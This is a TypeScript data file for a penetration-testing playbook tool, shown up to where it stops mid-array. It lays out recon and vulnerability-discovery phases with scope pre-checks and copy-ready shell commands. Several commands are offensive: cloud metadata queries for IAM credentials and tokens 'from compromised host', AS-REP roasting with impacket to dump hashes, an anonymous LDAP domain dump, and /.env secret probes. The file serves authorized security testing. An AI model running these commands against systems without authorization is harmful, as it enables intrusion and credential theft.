import type { Tag, Team } from '@/content/offensive-tools';
import type { Engagement } from '@/lib/engagements';
import type { TargetOS } from '@/lib/target-os';
import type { TechTag } from '@/lib/tech-tags';

/**
 * The pentesting lifecycle, in five phases. Each phase is now a
 * structured walkthrough — not just a label and a tag — with:
 *
 *   - `goal`       what the user is trying to achieve in this phase
 *   - `preChecks`  scope/legal/safety checks before starting
 *                  (engagement-aware: each check can be filtered to
 *                  specific engagement types via `appliesTo`)
 *   - `steps`      sequenced actions, each with tools + optional
 *                  engagement scope
 *   - `output`     what the user should have at the end of the phase
 *                  to feed into the next
 *
 * Order matters: the methodology view walks them in this order, the
 * timeline indicator uses indexes 1..N (padded as "01", "02"), and
 * the global `1`–`5` keybinds map to these positions.
 *
 * The legacy `tags` and `team` fields are retained — `toolsForPhase()`
 * in `lib/playbook/matching.ts` (used by the noscript static fallback)
 * still consumes them. The live walkthrough does not.
 */

/** A pointer to a tool/resource referenced from a step. Inline rather
 *  than referenced from a registry, so each step is self-contained. */
export type ToolKind = 'web' | 'cli' | 'gui';

export type ToolRef = {
  name: string;
  url: string;
  kind: ToolKind;
  /** Optional inline note explaining why this tool fits this step. */
  note?: string;
  /** Optional engagement scope — same semantics as PreCheck.appliesTo. */
  appliesTo?: Engagement[];
  /** Optional OS scope — only render when the user's target OS choice
   *  matches (or they're in mixed mode). Untagged tools are OS-neutral. */
  osApplies?: TargetOS[];
  /** Optional tech-stack scope — only render when at least one of these
   *  tags is in the user's selected tech tags. Empty selection = no
   *  filter applied. Untagged tools are tech-neutral. */
  techApplies?: TechTag[];
};

/** A pre-flight check the user should pass before starting the phase.
 *  When `appliesTo` is set, the check only renders for those engagement
 *  types; when omitted, the check is universal. */
export type PreCheck = {
  text: string;
  appliesTo?: Engagement[];
  /** Optional OS scope — same semantics as the others. Rare on
   *  pre-checks (most are OS-neutral safety/scope items). */
  osApplies?: TargetOS[];
  /** Optional tech-stack scope. Rare on pre-checks. */
  techApplies?: TechTag[];
};

/** A copy-ready command snippet attached to a step. The `command` string
 *  may include `{target}` (and any other `{name}` token) for runtime
 *  interpolation against the user-set target context. Renders as a
 *  monospace code block with a one-click copy button. */
export type CommandSnippet = {
  /** Optional short label shown above the command (e.g. "fast scan",
   *  "thorough"). Useful when a step ships multiple variants. */
  label?: string;
  /** The shell snippet, with `{target}` for interpolation. */
  command: string;
  /** Optional engagement scope. When set, the command only renders
   *  for those engagements — necessary for variants that explicitly
   *  belong to one (e.g. "lab — loud" linpeas vs "private — quiet"
   *  manual triage). */
  appliesTo?: Engagement[];
  /** Optional OS scope — same semantics as ToolRef.osApplies. */
  osApplies?: TargetOS[];
  /** Optional tech-stack scope — same semantics as ToolRef.techApplies. */
  techApplies?: TechTag[];
  /** Optional MITRE ATT&CK technique IDs this command demonstrates —
   *  e.g. `["T1558.003"]` for kerberoasting, `["T1003.006"]` for
   *  DCSync. Used by the API for the defense thread-back ("you ran
   *  X, here's the detection") and by future filters that let
   *  consumers search by technique. */
  mitreTechniques?: string[];
};

/** An inline branching prompt — "if {if} → jump to {goto}". The user
 *  clicks the chip and the playbook jumps to the named phase (and
 *  optionally to a specific step). Used to encode common decision
 *  points in the walkthrough so the path through the tree is itself
 *  interactive, not just a flat sequence. */
export type Branch = {
  /** The condition phrase, rendered as "if {if} →". Sentence-case. */
  if: string;
  /** Target phase slug — must match a Phase.slug. */
  goto: string;
};

/** One sequenced action within a phase. */
export type PhaseStep = {
  title: string;
  description: string;
  tools?: ToolRef[];
  /** Optional copy-ready command snippets, with `{target}` interpolation. */
  commands?: CommandSnippet[];
  /** Optional branching prompts shown as inline chips. */
  branches?: Branch[];
  /** Engagement scoping — same semantics as PreCheck.appliesTo. */
  appliesTo?: Engagement[];
  /** OS scoping — gates the entire step (rare; usually fine to leave
   *  the step OS-neutral and tag the OS-specific commands/tools
   *  inside it instead). */
  osApplies?: TargetOS[];
  /** Tech-stack scoping — gates the entire step (rare). */
  techApplies?: TechTag[];
  /** When true, tech-tagged commands and tools inside this step are
   *  HIDDEN unless the user has selected matching tags. The default
   *  ("show tech-tagged when selection is empty") is wrong for
   *  discovery-time steps where the user hasn't yet identified the
   *  stack — set this to true on those steps so the noise of every
   *  per-tech probe doesn't drown out the generic ones. */
  requiresTechSelection?: boolean;
};

export type Phase = {
  slug: string;
  index: number;
  name: string;
  /** Short label for the timeline. ≤ 8 chars works best. */
  short: string;
  /** One-line summary, used in the phase header. */
  blurb: string;

  /** Longer "what you're achieving in this phase" — rendered prominently
   *  under the phase name. */
  goal: string;

  /** Scope/legal/safety checks before starting. Engagement-filtered. */
  preChecks?: PreCheck[];

  /** Sequenced actions. */
  steps: PhaseStep[];

  /** What the user should have at the end of the phase. */
  output: string;

  /** Legacy: drives `toolsForPhase()` in matching.ts (noscript). */
  tags: Tag[];
  /** Legacy: drives team scoping in `toolsForPhase()`. */
  team?: Team | 'all';
};

/* ============================================================ Catalog */

export const PHASES: Phase[] = [
  /* ─────────────── Phase 1: Reconnaissance (fully populated) ─────────────── */
  {
    slug: 'recon',
    index: 1,
    name: 'Reconnaissance',
    short: 'Recon',
    blurb:
      'Map the target — domains, hosts, services, people — without touching anything sensitive. Passive first, light-touch active second.',
    goal:
      "Build a complete picture of the target's external surface so the rest of the engagement is grounded in real assets — not guesses. Passive recon is free and silent; active recon is louder and only valid once scope is confirmed.",
    preChecks: [
      {
        appliesTo: ['bug-bounty'],
        text: "Re-read the program's scope page. Confirm every domain/IP you intend to query is explicitly listed. Subdomains of in-scope domains are NOT in-scope by default.",
      },
      {
        appliesTo: ['private'],
        text: 'Confirm the signed Rules of Engagement covers the IP ranges, domains, and applications you are about to enumerate. Verify any blackout windows.',
      },
      {
        appliesTo: ['bug-bounty', 'private'],
        text: 'Note your source IP and (if required by the program/RoE) set the agreed user-agent or X-* header. Some programs filter testing traffic by these.',
      },
      {
        appliesTo: ['bug-bounty'],
        text: 'Confirm what active testing the program allows. Most allow rate-limited port scans and content discovery against in-scope assets; almost all forbid vendor-grade scanners (Nessus, Burp Pro active scan, OpenVAS) and DoS-y rates. Specific allow/deny lists vary by program — check the rules.',
      },
      {
        appliesTo: ['private'],
        text: 'Active scanning rate, target lists, and allowed techniques live in the RoE. Confirm before launching anything.',
      },
      {
        appliesTo: ['private'],
        text: 'Identify the client\u2019s escalation chain BEFORE you start. If the client has a SOC, who do you call when you trigger a real alert? Get a phone number, not just an email.',
      },
    ],
    steps: [
      {
        title: 'Passive DNS and certificate transparency',
        description:
          "Pull the historical DNS picture and certificate transparency logs to surface subdomains without sending DNS queries to the target's nameservers. CT logs are a goldmine for forgotten or staging subdomains.",
        // Lab boxes have no public DNS / CT footprint — VPN-only IPs
        // aren't in any of these datasets.
        appliesTo: ['bug-bounty', 'private'],
        commands: [
          {
            label: 'subfinder — aggregate 30+ passive sources',
            command: 'mkdir -p engagements/{target}/recon && subfinder -d {target} -all -recursive -o engagements/{target}/recon/subdomains.txt',
            mitreTechniques: ['T1590.005', 'T1596.001'],
          },
          {
            label: 'crt.sh — CT log dump',
            command: "mkdir -p engagements/{target}/recon && curl -s 'https://crt.sh/?q=%25.{target}&output=json' | jq -r '.[].name_value' | sort -u > engagements/{target}/recon/crtsh.txt",
          },
        ],
        tools: [
          { name: 'crt.sh', url: 'https://crt.sh/', kind: 'web', note: 'CT log search by domain' },
          { name: 'Subfinder', url: 'https://github.com/projectdiscovery/subfinder', kind: 'cli', note: 'Aggregates 30+ passive sources' },
          { name: 'DNSDumpster', url: 'https://dnsdumpster.com/', kind: 'web', note: 'DNS visualization, complementary to crt.sh' },
        ],
      },
      {
        title: 'Internet-scan service queries',
        description:
          'Search public scan datasets for what is publicly exposed — services, banners, certificates, known vulnerabilities. These are observations of the public internet, not active probes against the target.',
        // Lab IPs are private/VPN-only and don't appear in Shodan/Censys.
        appliesTo: ['bug-bounty', 'private'],
        commands: [
          {
            label: 'shodan — host lookup',
            command: 'mkdir -p engagements/{target}/recon && shodan host {target} | tee engagements/{target}/recon/shodan-host.txt',
          },
          {
            label: 'shodan — search by hostname',
            command: "mkdir -p engagements/{target}/recon && shodan search 'hostname:{target}' --fields ip_str,port,product,version > engagements/{target}/recon/shodan-search.txt",
          },
          {
            label: 'censys — JSON dump',
            command: "mkdir -p engagements/{target}/recon && censys search '{target}' --pages 1 -O json > engagements/{target}/recon/censys.json",
          },
        ],
        tools: [
          { name: 'Shodan', url: 'https://www.shodan.io/', kind: 'web' },
          { name: 'Censys Search', url: 'https://search.censys.io/', kind: 'web', note: 'Often surfaces what Shodan misses' },
        ],
      },
      {
        title: 'Active service discovery',
        description:
          'Scan in-scope IPs for open ports and service versions. Engagement context drives the speed: for `bug-bounty`, rate-limit (e.g. nmap `-T2`/`-T3`) against in-scope IPs only — most programs allow this, some don\'t, check first. For `private`, slow + single-threaded against sensitive networks; honor scanning windows in the RoE. For `lab`, full speed is fine and often the point. Banner-grabbing is not a vuln scan — validate findings before flagging. Masscan is default in lab, requires explicit authorization elsewhere.',
        commands: [
          {
            label: 'nmap — quiet (BB / private)',
            command: 'mkdir -p engagements/{target}/recon && nmap -sV -sC -T2 --top-ports 1000 -oN engagements/{target}/recon/nmap-quiet.txt {target}',
            appliesTo: ['bug-bounty', 'private'],
            mitreTechniques: ['T1595.001', 'T1595.002'],
          },
          {
            label: 'nmap — thorough (lab)',
            command: 'mkdir -p engagements/{target}/recon && nmap -sV -sC -p- -T4 -oA engagements/{target}/recon/nmap-thorough {target}',
            appliesTo: ['lab'],
            mitreTechniques: ['T1595.001', 'T1595.002'],
          },
          {
            label: 'naabu — fast TCP discovery',
            command: 'mkdir -p engagements/{target}/recon && naabu -host {target} -p - -rate 1000 -o engagements/{target}/recon/naabu.txt',
            mitreTechniques: ['T1595.001'],
          },
        ],
        branches: [
          { if: 'versioned services discovered', goto: 'vuln' },
        ],
        tools: [
          { name: 'Nmap', url: 'https://nmap.org/book/', kind: 'cli', note: 'The Nmap book is the canonical reference' },
          { name: 'Naabu', url: 'https://github.com/projectdiscovery/naabu', kind: 'cli', note: 'Fast, focused port scanner' },
          { name: 'Masscan', url: 'https://github.com/robertdavidgraham/masscan', kind: 'cli', note: 'Extremely fast \u2014 lab-default; explicit authorization required elsewhere' },
        ],
      },
      {
        title: 'Content / endpoint discovery (web targets)',
        description:
          "Enumerate paths, parameters, and JS-discovered endpoints on each in-scope web app. For `bug-bounty`: rate-limit ffuf/feroxbuster (e.g. `-rate 50`); crawl first via Katana/Burp before bruteforcing. For `private`: same, plus respect any RoE-defined throttling. For `lab`: blast away, default rates are fine. Wayback URLs are pure passive lookup and apply to all.",
        commands: [
          {
            label: 'ffuf — paths (rate-limited)',
            command: "mkdir -p engagements/{target}/recon && ffuf -u 'https://{target}/FUZZ' -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,204,301,302,401,403 -rate 50 -o engagements/{target}/recon/ffuf.json -of json",
          },
          {
            label: 'katana — JS-aware crawl',
            command: 'mkdir -p engagements/{target}/recon && katana -u https://{target} -d 3 -jc -o engagements/{target}/recon/katana.txt',
          },
          {
            label: 'wayback — historical URLs (passive)',
            command: "mkdir -p engagements/{target}/recon && curl -s 'https://web.archive.org/cdx/search/cdx?url={target}/*&output=text&fl=original&collapse=urlkey' > engagements/{target}/recon/wayback.txt",
          },
        ],
        tools: [
          { name: 'ffuf', url: 'https://github.com/ffuf/ffuf', kind: 'cli', note: 'Fast HTTP fuzzer; rate-limit with `-rate`' },
          { name: 'Katana', url: 'https://github.com/projectdiscovery/katana', kind: 'cli', note: 'JS-aware crawler — passive against the live site' },
          { name: 'Wayback Machine', url: 'https://web.archive.org/', kind: 'web', note: 'Historical URLs and parameters — fully passive' },
        ],
      },
      {
        title: 'Hostname and virtual-host discovery',
        description:
          "Lab boxes commonly serve different content based on the Host header. After the first port hits, watch for redirects to a hostname (add it to /etc/hosts), then bruteforce vhosts against the discovered host. The HTB pattern of `machine.htb` with admin/dev/staging vhosts on the same IP is endemic.",
        appliesTo: ['lab'],
        commands: [
          {
            label: 'add to /etc/hosts',
            command: 'echo "{target} machine.htb" | sudo tee -a /etc/hosts',
          },
          {
            label: 'ffuf — vhost bruteforce',
            command: "mkdir -p engagements/{target}/recon && ffuf -u 'http://{target}' -H 'Host: FUZZ.machine.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fs 0 -o engagements/{target}/recon/ffuf-vhost.json -of json",
          },
        ],
        tools: [
          { name: 'ffuf (vhost mode)', url: 'https://github.com/ffuf/ffuf', kind: 'cli', note: '-u http://target -H "Host: FUZZ.machine.htb"' },
          { name: 'gobuster vhost', url: 'https://github.com/OJ/gobuster', kind: 'cli', note: 'gobuster vhost -u http://target -w wordlist' },
        ],
      },
      {
        title: 'OSINT on people and organization',
        description:
          'Identify who works at the target, what they have published (talks, papers, GitHub commits), and what credentials may have already leaked.',
        // Lab boxes have fictional personas — no real people to OSINT,
        // no real org with breach history.
        appliesTo: ['bug-bounty', 'private'],
        commands: [
          {
            label: 'theHarvester — emails / hosts / sources',
            command: 'mkdir -p engagements/{target}/recon && theHarvester -d {target} -b crtsh,duckduckgo,bing,hackertarget -f engagements/{target}/recon/osint',
            mitreTechniques: ['T1589.002', 'T1591'],
          },
          {
            label: 'github code search — leaked references to target',
            command: "open 'https://github.com/search?type=code&q=%22{target}%22'",
          },
        ],
        tools: [
          { name: 'theHarvester', url: 'https://github.com/laramies/theHarvester', kind: 'cli', note: 'Aggregates emails, subdomains, hosts from passive sources' },
          { name: 'Hunter.io', url: 'https://hunter.io/', kind: 'web', note: 'Email format and verified contacts' },
          { name: 'Have I Been Pwned', url: 'https://haveibeenpwned.com/', kind: 'web', note: 'Per-domain breach search' },
        ],
      },
      {
        title: 'Technology fingerprinting',
        description:
          'For each web app and exposed service, identify the stack (web server, framework, CMS, JS libraries, version where possible). Versions feed directly into the next phase. For `lab`, stick to CLI tools — Wappalyzer/BuiltWith only work against the public internet.',
        /* Discovery-time step: per-tech probes hide until you pick
           tags. Avoids drowning the generic whatweb/httpx commands
           in a wall of every-stack-at-once probes you don\'t need yet. */
        requiresTechSelection: true,
        commands: [
          {
            label: 'whatweb',
            command: 'mkdir -p engagements/{target}/recon && whatweb -a 3 https://{target} | tee engagements/{target}/recon/whatweb.txt',
          },
          {
            label: 'httpx — tech detection',
            command: 'mkdir -p engagements/{target}/recon && httpx -u {target} -td -title -status-code -tech-detect -o engagements/{target}/recon/httpx.txt',
          },
          /* Per-tech fingerprinting probes — surface only when the
             user has identified (or suspects) the relevant stack. */
          {
            label: 'apache — server-status / server-info probe',
            command: 'mkdir -p engagements/{target}/recon && for p in /server-status /server-info /.htaccess; do echo "=== $p ===" && curl -ksSL -o - https://{target}$p; done | tee engagements/{target}/recon/apache-probes.txt',
            techApplies: ['apache'],
          },
          {
            label: 'nginx — status + common misconfigs',
            command: 'mkdir -p engagements/{target}/recon && for p in /nginx_status /.well-known/ /api/.; do echo "=== $p ===" && curl -ksSL -o - https://{target}$p; done | tee engagements/{target}/recon/nginx-probes.txt',
            techApplies: ['nginx'],
          },
          {
            label: 'wordpress — wpscan enumerate users + plugins (passive)',
            command: 'mkdir -p engagements/{target}/recon && wpscan --url https://{target} --enumerate u,vp,vt --no-update -o engagements/{target}/recon/wpscan.txt',
            techApplies: ['wordpress'],
          },
          {
            label: 'wordpress — REST API user dump (no auth needed if exposed)',
            command: 'mkdir -p engagements/{target}/recon && curl -ksSL https://{target}/wp-json/wp/v2/users | jq | tee engagements/{target}/recon/wp-users.json',
            techApplies: ['wordpress'],
          },
          {
            label: 'wordpress — author-id enumeration via redirect',
            command: 'mkdir -p engagements/{target}/recon && for i in $(seq 1 10); do echo "uid=$i $(curl -ksSI -o /dev/null -w \'%{http_code} %{redirect_url}\' https://{target}/?author=$i)"; done | tee engagements/{target}/recon/wp-author-enum.txt',
            techApplies: ['wordpress'],
          },
          {
            label: 'spring boot — actuator endpoint sweep',
            command: "mkdir -p engagements/{target}/recon && for p in /actuator /actuator/env /actuator/heapdump /actuator/mappings /actuator/health; do echo \"=== $p ===\" && curl -ksSI -o /dev/null -w '%{http_code}\\n' https://{target}$p; done | tee engagements/{target}/recon/spring-actuator.txt",
            techApplies: ['spring'],
          },
          {
            label: 'iis — common short-name + handler probes',
            command: "mkdir -p engagements/{target}/recon && for p in /aspnet_client/ /trace.axd /elmah.axd '/*~1*/.aspx'; do echo \"=== $p ===\" && curl -ksSL -o /dev/null -w '%{http_code} %{url_effective}\\n' https://{target}$p; done | tee engagements/{target}/recon/iis-probes.txt",
            techApplies: ['iis'],
          },
          {
            label: 'k8s — kubelet + dashboard probes',
            command: 'mkdir -p engagements/{target}/recon && for p in /metrics /healthz /api/v1/nodes /api /apis; do echo "=== $p ===" && curl -ksSL -o /dev/null -w \'%{http_code}\\n\' https://{target}:10250$p https://{target}:8001$p https://{target}:6443$p; done | tee engagements/{target}/recon/k8s-probes.txt',
            techApplies: ['k8s'],
          },
          /* Cloud-recon pack. Tags exist (aws/gcp/azure) — these
             are the bare-minimum probes for each. Subdomain takeover
             checks for S3/storage, IMDS endpoint probes (won\'t
             succeed externally but documents the surface area), and
             SDK enumeration if the user already has stolen creds
             (rotated to post-ex normally — these recon-time entries
             are the discovery layer). */
          {
            label: 'aws — public S3 bucket fingerprint by name',
            command: 'mkdir -p engagements/{target}/recon && for prefix in "" "dev-" "prod-" "staging-" "backup-" "assets-"; do bucket="${prefix}{target}"; bucket="${bucket//./-}"; echo "=== $bucket ===" && curl -ksSI "https://${bucket}.s3.amazonaws.com/" | head -1; done | tee engagements/{target}/recon/s3-probes.txt',
            techApplies: ['aws'],
          },
          {
            label: 'aws — IMDSv1/v2 surface probe (run from inside SSRF/RCE)',
            command: 'echo "From compromised host: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ ; for IMDSv2: TOKEN=$(curl -X PUT http://169.254.169.254/latest/api/token -H \\"X-aws-ec2-metadata-token-ttl-seconds: 60\\") && curl -H \\"X-aws-ec2-metadata-token: $TOKEN\\" http://169.254.169.254/latest/meta-data/" | tee engagements/{target}/recon/aws-imds.txt',
            techApplies: ['aws'],
          },
          {
            label: 'gcp — public Cloud Storage bucket probe',
            command: 'mkdir -p engagements/{target}/recon && for prefix in "" "dev-" "prod-" "staging-"; do bucket="${prefix}{target}"; bucket="${bucket//./-}"; echo "=== $bucket ===" && curl -ksSI "https://storage.googleapis.com/${bucket}/" | head -1; done | tee engagements/{target}/recon/gcs-probes.txt',
            techApplies: ['gcp'],
          },
          {
            label: 'gcp — metadata endpoint probe (run from inside SSRF/RCE)',
            command: 'echo "From compromised host: curl -s -H \\"Metadata-Flavor: Google\\" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | tee engagements/{target}/recon/gcp-imds.txt',
            techApplies: ['gcp'],
          },
          {
            label: 'azure — public blob container probe',
            command: 'mkdir -p engagements/{target}/recon && account="${target//./}"; for c in "" "files" "uploads" "backup" "media"; do echo "=== $account/$c ===" && curl -ksSI "https://${account}.blob.core.windows.net/${c}?restype=container&comp=list" | head -1; done | tee engagements/{target}/recon/azure-blob.txt',
            techApplies: ['azure'],
          },
          {
            label: 'azure — IMDS endpoint probe (run from inside SSRF/RCE)',
            command: 'echo "From compromised host: curl -s -H \\"Metadata: true\\" \\"http://169.254.169.254/metadata/instance?api-version=2021-02-01\\"" | tee engagements/{target}/recon/azure-imds.txt',
            techApplies: ['azure'],
          },
          {
            label: 'node — exposed env + manifest probes',
            command: 'mkdir -p engagements/{target}/recon && for p in /.env /.env.local /package.json /package-lock.json /yarn.lock /node_modules/ /server.js; do echo "=== $p ===" && curl -ksSL -o /dev/null -w \'%{http_code} %{size_download}b\\n\' https://{target}$p; done | tee engagements/{target}/recon/node-probes.txt',
            techApplies: ['node'],
          },
          {
            label: 'node — Next.js fingerprint via /_next/static',
            command: 'mkdir -p engagements/{target}/recon && curl -ksSL https://{target}/_next/static/ -o engagements/{target}/recon/next-static.html && grep -oE "buildId.{0,40}" engagements/{target}/recon/next-static.html | head -3',
            techApplies: ['node'],
          },
          {
            label: 'node — express x-powered-by + error-page fingerprint',
            command: 'mkdir -p engagements/{target}/recon && curl -ksSI https://{target}/ | grep -i "x-powered-by\\|server" | tee engagements/{target}/recon/node-headers.txt',
            techApplies: ['node', 'express'],
          },
          {
            label: 'postgres — port 5432 nse scripts',
            command: 'mkdir -p engagements/{target}/recon && nmap -p 5432 --script "pg-* and not brute" {target} -oN engagements/{target}/recon/nmap-postgres.txt',
            techApplies: ['postgres'],
          },
          {
            label: 'mysql — port 3306 nse scripts',
            command: 'mkdir -p engagements/{target}/recon && nmap -p 3306 --script "mysql-info,mysql-empty-password,mysql-users" {target} -oN engagements/{target}/recon/nmap-mysql.txt',
            techApplies: ['mysql'],
          },
          /* Active Directory probe pack — kerberos + ldap as discrete
             "tech stacks". Internal Windows engagements live or die on
             these; before this pack the playbook treated AD as
             implicit, surfacing nothing under the kerberos / ldap
             tags. Now picking either surfaces the right enumeration
             commands at recon time. */
          {
            label: 'ldap — anonymous bind probe',
            command: 'mkdir -p engagements/{target}/recon && ldapsearch -x -H ldap://{target} -s base namingContexts | tee engagements/{target}/recon/ldap-anon.txt',
            techApplies: ['ldap'],
            osApplies: ['windows'],
          },
          {
            label: 'ldap — full domain dump (anonymous, if allowed)',
            command: 'mkdir -p engagements/{target}/recon && ldapsearch -x -H ldap://{target} -b "DC=example,DC=local" "(objectClass=*)" | tee engagements/{target}/recon/ldap-dump.txt',
            techApplies: ['ldap'],
            osApplies: ['windows'],
          },
          {
            label: 'kerberos — DC discovery via SRV records',
            command: 'mkdir -p engagements/{target}/recon && for srv in _ldap._tcp.dc._msdcs _kerberos._tcp.dc._msdcs _gc._tcp _kpasswd._tcp; do echo "=== $srv.{target} ===" && dig +short SRV $srv.{target}; done | tee engagements/{target}/recon/dc-srv.txt',
            techApplies: ['kerberos'],
            osApplies: ['windows'],
          },
          {
            label: 'kerberos — AS-REP roasting recon (no creds needed)',
            command: 'mkdir -p engagements/{target}/recon && impacket-GetNPUsers {target}/ -dc-ip {target} -usersfile users.txt -format hashcat -outputfile engagements/{target}/recon/asrep-hashes.txt -no-pass',
            techApplies: ['kerberos'],
            osApplies: ['windows'],
          },
          {
            label: 'smb — enum4linux-ng (null session enum)',
            command: 'mkdir -p engagements/{target}/recon && enum4linux-ng -A -oY engagements/{target}/recon/enum4linux {target}',
            techApplies: ['ldap'],
            osApplies: ['windows'],
          },
          {
            label: 'smb — null session share listing',
            command: 'mkdir -p engagements/{target}/recon && smbclient -L //{target} -N | tee engagements/{target}/recon/smb-shares.txt',
            techApplies: ['ldap'],
            osApplies: ['windows'],
          },
        ],
        branches: [
          { if: 'CMS or known framework version found', goto: 'vuln' },
          { if: 'AD discovered (kerberos / ldap responding)', goto: 'post-ex' },
        ],
        tools: [
          { name: 'WhatWeb', url: 'https://github.com/urbanadventurer/WhatWeb', kind: 'cli', note: 'Works against any HTTP target including lab IPs' },
          { name: 'httpx', url: 'https://github.com/projectdiscovery/httpx', kind: 'cli', note: 'Probes + tech detection at scale' },
          { name: 'Wappalyzer', url: 'https://www.wappalyzer.com/', kind: 'web', note: 'Browser extension — public sites only' },
          { name: 'WPScan', url: 'https://github.com/wpscanteam/wpscan', kind: 'cli', note: 'WordPress core + plugin + theme enum (token recommended)', techApplies: ['wordpress'] },
          { name: 'droopescan', url: 'https://github.com/droope/droopescan', kind: 'cli', note: 'Drupal / SilverStripe / Joomla version + module fingerprint' },
          { name: 'enum4linux-ng', url: 'https://github.com/cddmp/enum4linux-ng', kind: 'cli', note: 'Modern rewrite of enum4linux — AD/SMB null-session enum', techApplies: ['ldap'], osApplies: ['windows'] },
          { name: 'impacket', url: 'https://github.com/fortra/impacket', kind: 'cli', note: 'Python AD toolkit (GetNPUsers, GetUserSPNs, secretsdump, …)', techApplies: ['kerberos', 'ldap'], osApplies: ['windows'] },
        ],
      },
    ],
    output:
      "A scoped inventory of in-scope assets (IPs, ports, service versions, web technologies, hostnames) plus — for `bug-bounty`/`private` — a list of identified personnel, email patterns, and any leaked credentials surfaced from public sources. This inventory is the input to the vulnerability-discovery phase.",
    tags: ['recon'],
    team: 'offense',
  },

  /* ─────────────── Phase 2: Vulnerability discovery ─────────────── */
  {
    slug: 'vuln',
    index: 2,
    name: 'Vulnerability discovery',
    short: 'Vulns',
    blurb:
      'Turn the recon inventory into a prioritized list of testable weaknesses. Cross-reference CVEs, KEV, and EPSS before deciding what to actually look at.',
    goal:
      'Convert the recon inventory into a ranked list of weaknesses worth testing. Most vulns are not exploitable, exploitable vulns are not all equally impactful, and your time is finite — prioritize by exploit availability + business impact, not CVSS.',
    preChecks: [
      {
        text: 'Confirm your recon output is complete enough to scan against — versioned services, web tech fingerprints, and a deduplicated asset list.',
      },
      {
        appliesTo: ['bug-bounty'],
        text: "Re-read the program's rules on automated scanning. Most programs forbid noisy scanners (Nessus, OpenVAS, Burp Pro active scan); some allow them with rate limits. When in doubt, do passive lookups only.",
      },
      {
        appliesTo: ['private'],
        text: "Confirm your scanning windows in the RoE. Some clients require off-hours scanning; some require notification before any active scan. Clear these before launching.",
      },
      {
        appliesTo: ['private', 'lab'],
        text: 'Decide your noise budget. A loud scan will land you in someone\u2019s SIEM — for `private`, that\u2019s often the point; for `lab`, it\u2019s irrelevant. Choose accordingly.',
      },
    ],
    steps: [
      {
        title: 'CVE lookup against discovered versions',
        description:
          'For every versioned service from recon, query the CVE catalog. Pin to exact version where possible — "Apache 2.4" is not specific enough; "2.4.49" is.',
        commands: [
          {
            label: 'cvemap — apache CVEs',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -product apache -severity high,critical -limit 50 | tee engagements/{target}/vuln/cves-apache.txt',
            techApplies: ['apache'],
          },
          {
            label: 'cvemap — nginx CVEs',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -product nginx -severity high,critical -limit 50 | tee engagements/{target}/vuln/cves-nginx.txt',
            techApplies: ['nginx'],
          },
          {
            label: 'cvemap — IIS CVEs',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -vendor microsoft -product iis -severity high,critical -limit 50 | tee engagements/{target}/vuln/cves-iis.txt',
            techApplies: ['iis'],
          },
          {
            label: 'cvemap — wordpress core + plugins',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -product wordpress -severity high,critical -limit 50 | tee engagements/{target}/vuln/cves-wordpress.txt',
            techApplies: ['wordpress'],
          },
          {
            label: 'cvemap — generic (set the product yourself)',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -product PRODUCT -severity high,critical -limit 50 | tee engagements/{target}/vuln/cves.txt',
          },
          {
            label: 'searchsploit — apache (interpolates {version})',
            command: 'mkdir -p engagements/{target}/vuln && searchsploit apache {version} | tee engagements/{target}/vuln/searchsploit-apache.txt',
            techApplies: ['apache'],
          },
          {
            label: 'searchsploit — nginx (interpolates {version})',
            command: 'mkdir -p engagements/{target}/vuln && searchsploit nginx {version} | tee engagements/{target}/vuln/searchsploit-nginx.txt',
            techApplies: ['nginx'],
          },
          {
            label: 'searchsploit — wordpress (interpolates {version})',
            command: 'mkdir -p engagements/{target}/vuln && searchsploit wordpress {version} | tee engagements/{target}/vuln/searchsploit-wordpress.txt',
            techApplies: ['wordpress'],
          },
          {
            label: 'searchsploit — IIS (interpolates {version})',
            command: 'mkdir -p engagements/{target}/vuln && searchsploit microsoft iis {version} | tee engagements/{target}/vuln/searchsploit-iis.txt',
            techApplies: ['iis'],
          },
          /* AD-protocol CVE family. These don\'t fit the
             "version-of-product" cvemap pattern — they\'re named
             vulnerabilities of the AD/Kerberos protocol stack,
             often exploitable on a fully-patched DC because of
             default config or schema design. Keep them as named
             commands with explicit CVE references rather than a
             cvemap product lookup. */
          {
            label: 'cvemap — Zerologon (CVE-2020-1472, Netlogon EoP)',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -id CVE-2020-1472 | tee engagements/{target}/vuln/zerologon.txt',
            techApplies: ['kerberos'],
            osApplies: ['windows'],
          },
          {
            label: 'cvemap — PrintNightmare (CVE-2021-1675 + CVE-2021-34527)',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -id CVE-2021-1675,CVE-2021-34527 | tee engagements/{target}/vuln/printnightmare.txt',
            osApplies: ['windows'],
          },
          {
            label: 'cvemap — NoPac / sAMAccountName confusion (CVE-2021-42278 + CVE-2021-42287)',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -id CVE-2021-42278,CVE-2021-42287 | tee engagements/{target}/vuln/nopac.txt',
            techApplies: ['kerberos'],
            osApplies: ['windows'],
          },
          {
            label: 'cvemap — Certifried / ADCS ESC family (CVE-2022-26923)',
            command: 'mkdir -p engagements/{target}/vuln && cvemap -id CVE-2022-26923 | tee engagements/{target}/vuln/certifried.txt',
            techApplies: ['kerberos', 'ldap'],
            osApplies: ['windows'],
          },
          {
            label: 'nuclei — AD-tagged vuln templates',
            command: 'mkdir -p engagements/{target}/vuln && nuclei -u {target} -tags ad,kerberos,ldap,smb -severity high,critical -o engagements/{target}/vuln/nuclei-ad.txt',
            techApplies: ['kerberos', 'ldap'],
            osApplies: ['windows'],
          },
          {
            label: 'searchsploit — generic (set the query yourself)',
            command: 'mkdir -p engagements/{target}/vuln && searchsploit QUERY | tee engagements/{target}/vuln/searchsploit.txt',
            mitreTechniques: ['T1588.005'],
          },
        ],
        branches: [
          { if: 'zero CVEs match — manual checks instead', goto: 'vuln' },
        ],
        tools: [
          { name: 'NVD', url: 'https://nvd.nist.gov/', kind: 'web', note: 'Official CVE database' },
          { name: 'OSV', url: 'https://osv.dev/', kind: 'web', note: 'Cross-ecosystem (npm, PyPI, OS packages, etc.)' },
